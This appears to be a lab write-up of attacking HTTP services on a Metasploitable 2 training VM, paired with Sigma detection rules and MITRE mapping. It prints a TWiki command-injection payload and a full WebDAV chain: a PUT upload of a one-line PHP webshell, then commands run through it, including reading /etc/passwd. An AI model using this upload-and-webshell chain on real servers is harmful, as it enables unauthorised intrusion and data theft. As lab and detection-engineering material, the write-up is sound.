# Port 80 — HTTP (Apache/TWiki/WebDAV) — Metasploitable 2

## Service Identification

- **Port/Protocol:** 80/TCP
- **Server:** Apache httpd 2.2.8 (Ubuntu) DAV/2
- **Target:** Metasploitable 2 (192.168.75.130)
- **Hosted applications (from index page):** TWiki, phpMyAdmin, Mutillidae, DVWA, WebDAV
nmap -p 80 -sV 192.168.75.130

curl -s http://192.168.75.130/

The root index page directly linked all five hosted applications — no directory brute-forcing was needed to discover them, since the target explicitly listed them. This was a deliberate recon decision: brute-force discovery tools (feroxbuster, gobuster) are for filling gaps in unknown attack surface, not a mandatory first step when the target already discloses its structure.

## Target 1: TWiki — Investigated, Confirmed Not Exploitable

### Enumeration
curl -sIL http://192.168.75.130/twiki/

curl -s http://192.168.75.130/twiki/

The TWiki landing page directly linked the application entry point (`./bin/view/Main/WebHome`) and version documentation (`readme.txt`), again without requiring brute-force discovery:
curl -s http://192.168.75.130/twiki/readme.txt

**Version identified:** `01 Feb 2003` (TWiki release `20030201`).

### Vulnerability Research
searchsploit twiki

searchsploit -p cgi/webapps/642.pl

Identified a precise version match: **TWiki 20030201 — 'search.pm' Remote Command Execution** (EDB-ID 642, CVE-2004-1037), exploiting unsanitized input in the `search` parameter that breaks out of an expected quoting context and injects shell commands, exfiltrating output via TWiki's own bolded-search-result HTML rendering as a covert output channel.

### Exploitation Attempts

1. **Default exploit path** (`/cgi-bin/twiki/search/Main/`) → `404 Not Found`. This install uses `/twiki/bin/` URL structure, not the older CGI-alias convention the 2004 PoC assumed.
2. **Corrected path** (`/twiki/bin/search/Main/`) → Exploit ran, endpoint responded, but injection did not fire: *"Sorry, exploit didn't work!"*
3. **Direct manual verification** — sent raw shell metacharacters directly as the search parameter to confirm definitively whether injection was possible at all:
curl -s "http://192.168.75.130/twiki/bin/search/Main/?search=test%27%3B(id)%3B%27&scope=text"
   Result: input reflected verbatim and safely (`test';(id);'`), with no shell interpretation or HTML escaping anomaly — confirming the injection vector does not work on this specific build via this method.

### Conclusion

Despite a version string matching a known historical RCE, **this specific TWiki installation's `search.pm` did not prove exploitable via the documented 2004 technique** within three escalating, evidence-based attempts (path correction, endpoint verification, direct raw-payload test). This is documented as an honest negative finding rather than a silent abandonment — version strings alone do not guarantee exploitability; the actual backend code path must be tested directly.

## Target 2: WebDAV — Successful RCE

### Enumeration
curl -X OPTIONS http://192.168.75.130/dav/ -v

Server advertised allowed methods: `OPTIONS, GET, HEAD, POST, DELETE, TRACE, PROPFIND, PROPPATCH, COPY, MOVE, LOCK, UNLOCK`. **Notably, `PUT` was absent from this list.**

### Exploitation

Rather than trust the `Allow` header at face value, `PUT` was tested directly:
curl -v -X PUT http://192.168.75.130/dav/test.txt -d "hello world"

Result: **`201 Created`** — `PUT` worked despite not being advertised, confirming the `Allow` header did not reflect actual server enforcement. This is a reusable lesson: HTTP `OPTIONS` responses should be verified empirically, not trusted as ground truth.

A minimal PHP webshell was then uploaded:
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -v -X PUT http://192.168.75.130/dav/shell.php --data-binary @shell.php

Result: `201 Created`.

### What Was Gained

Remote command execution as the web server user, confirmed via:
curl "http://192.168.75.130/dav/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
curl "http://192.168.75.130/dav/shell.php?cmd=cat%20/etc/passwd"
Full /etc/passwd contents returned

Full exploit chain: **WebDAV misconfiguration → unauthenticated arbitrary file upload → PHP webshell → remote code execution → sensitive file disclosure.**

## Detection Engineering

Apache's `access.log` captured the entire attack chain cleanly in standard combined log format — a notably better logging situation than Telnet (port 23) or SMTP/VRFY (port 25), both of which had logging gaps requiring compensating detection strategies.

This attack consists of **two distinct MITRE-mapped stages**, chained but independently detectable:

1. **Upload stage** — `PUT /dav/shell.php` — maps to **T1190 (Exploit Public-Facing Application)** and **T1505.003 (Web Shell)**, under Initial Access / Persistence.
2. **Execution stage** — `GET /dav/shell.php?cmd=...` — maps to **T1059 (Command and Scripting Interpreter)**, under Execution.

Two independent Sigma rules were written rather than one combined rule, deliberately providing detection coverage at two separate points in the kill chain — a defender could catch the upload and prevent execution entirely, or catch suspicious `cmd=` parameter usage even if the upload itself was missed.

### Rule 1 — Upload Detection

See [`sigma-rules/webdav_put_executable_upload.yml`](../sigma-rules/webdav_put_executable_upload.yml)

Detects any `PUT` request targeting a path ending in an executable server-side extension (`.php`, `.asp`, `.aspx`, `.jsp`, `.cgi`). This is a **single-event, high-confidence rule** — unlike the Telnet brute-force rule, no frequency threshold is needed, since a `PUT` request uploading an executable file type is rarely, if ever, legitimate traffic.

### Rule 2 — Execution Detection

See [`sigma-rules/webshell_cmd_parameter_execution.yml`](../sigma-rules/webshell_cmd_parameter_execution.yml)

Detects `GET` requests containing common webshell command-parameter names (`cmd=`, `exec=`, `shell=`). Documented as a lower-confidence standalone signal (legitimate apps occasionally use `cmd=` as a parameter name), intended to be correlated with Rule 1 for higher-confidence detection — both rules fired in sequence in this exact attack.

### Validation

Both rules were validated directly against the real captured Apache access log entries from this session:
PUT /dav/shell.php HTTP/1.1" 201 273 ...

GET /dav/shell.php?cmd=id HTTP/1.1" 200 55 ...

GET /dav/shell.php?cmd=cat%20/etc/passwd HTTP/1.1" 200 1582 ...

Both rules' detection logic correctly matches these real log lines.

## MITRE ATT&CK Mapping

- **T1190** — Exploit Public-Facing Application
- **T1505.003** — Server Software Component: Web Shell
- **T1059** — Command and Scripting Interpreter

## Real-World Context

WebDAV misconfigurations remain a realistic finding in modern environments — particularly on IIS and Apache servers where WebDAV is enabled for legitimate file-sharing purposes but insufficiently restricted by file extension or authentication. The `OPTIONS`-header-lies-about-allowed-methods finding here is also a transferable lesson: automated tooling that trusts `Allow` headers without direct verification can produce false negatives in real assessments.

## Interview Articulation

*"I found that TWiki's version string matched a known 2004 RCE, but rather than assume it was exploitable, I tested it three separate ways — corrected the URL path, ran the original exploit, and finally sent raw shell metacharacters directly to confirm the injection genuinely didn't work on this build. That negative result is documented honestly rather than hidden. On WebDAV, I didn't trust the server's own OPTIONS response, which didn't list PUT as allowed — I tested it directly anyway and got a 201 Created, proving the header was misleading. That gave me unauthenticated file upload, which I used to drop a PHP webshell and get full command execution as www-data. Because this attack has two distinct MITRE-mapped stages — upload and execution — I wrote two independent Sigma rules instead of one, so a defender has two separate chances to catch it even if one stage is missed."*